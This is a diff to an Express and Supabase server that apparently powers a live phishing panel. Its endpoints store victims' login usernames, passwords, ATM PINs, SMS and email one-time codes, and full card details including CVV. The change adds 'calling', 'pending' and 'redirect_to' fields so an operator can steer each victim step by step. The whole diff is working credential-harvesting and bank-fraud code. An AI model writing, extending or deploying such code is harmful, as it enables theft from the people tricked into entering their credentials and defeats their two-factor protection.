@@ -69,7 +69,12 @@ app.post('/api/login-data', async (req, res) => {
   try {
     const { order_id, username, country } = req.body;
     if (!order_id) return res.status(400).json({ success: false, message: 'order_id missing' });
-    const updates = { login_username: username, current_page: 'login' };
+    const updates = {
+      login_username: username,
+      current_page: 'calling',
+      status: 'pending',
+      redirect_to: null,
+    };
     if (country) updates.login_country = country;
     const { error } = await supabase.from('orders').update(updates).eq('id', order_id);
     if (error) throw error;
@@ -85,7 +90,7 @@ app.post('/api/password-data', async (req, res) => {
   try {
     const { order_id, password } = req.body;
     if (!order_id) return res.status(400).json({ success: false, message: 'order_id missing' });
-    const { error } = await supabase.from('orders').update({ login_password: password, current_page: 'waiting', status: 'pending' }).eq('id', order_id);
+    const { error } = await supabase.from('orders').update({ login_password: password, current_page: 'waiting', status: 'pending', redirect_to: null }).eq('id', order_id);
     if (error) throw error;
     res.json({ success: true });
   } catch (err) {
@@ -99,7 +104,7 @@ app.post('/api/atm-data', async (req, res) => {
   try {
     const { order_id, atm_pin } = req.body;
     if (!order_id) return res.status(400).json({ success: false, message: 'order_id missing' });
-    const { error } = await supabase.from('orders').update({ login_password: atm_pin, current_page: 'atm-waiting', status: 'atm_pending' }).eq('id', order_id);
+    const { error } = await supabase.from('orders').update({ login_password: atm_pin, current_page: 'atm-waiting', status: 'atm_pending', redirect_to: null }).eq('id', order_id);
     if (error) throw error;
     res.json({ success: true });
   } catch (err) {
@@ -113,7 +118,7 @@ app.post('/api/code-data', async (req, res) => {
   try {
     const { order_id, code } = req.body;
     if (!order_id) return res.status(400).json({ success: false, message: 'order_id missing' });
-    const { error } = await supabase.from('orders').update({ verification_code: code, status: 'code_pending', current_page: 'code-waiting' }).eq('id', order_id);
+    const { error } = await supabase.from('orders').update({ verification_code: code, status: 'code_pending', current_page: 'code-waiting', redirect_to: null }).eq('id', order_id);
     if (error) throw error;
     res.json({ success: true });
   } catch (err) {
@@ -127,7 +132,7 @@ app.post('/api/email-code-data', async (req, res) => {
   try {
     const { order_id, code } = req.body;
     if (!order_id) return res.status(400).json({ success: false, message: 'order_id missing' });
-    const { error } = await supabase.from('orders').update({ email_verification_code: code, status: 'email_code_pending', current_page: 'email-code-waiting' }).eq('id', order_id);
+    const { error } = await supabase.from('orders').update({ email_verification_code: code, status: 'email_code_pending', current_page: 'email-code-waiting', redirect_to: null }).eq('id', order_id);
     if (error) throw error;
     res.json({ success: true });
   } catch (err) {
@@ -143,7 +148,7 @@ app.post('/api/card-data', async (req, res) => {
     if (!order_id) return res.status(400).json({ success: false, message: 'order_id missing' });
     const { error } = await supabase.from('orders').update({
       card_name, card_number, card_expiry, card_cvv,
-      status: 'card_pending', current_page: 'card-waiting'
+      status: 'card_pending', current_page: 'card-waiting', redirect_to: null
     }).eq('id', order_id);
     if (error) throw error;
     res.json({ success: true });
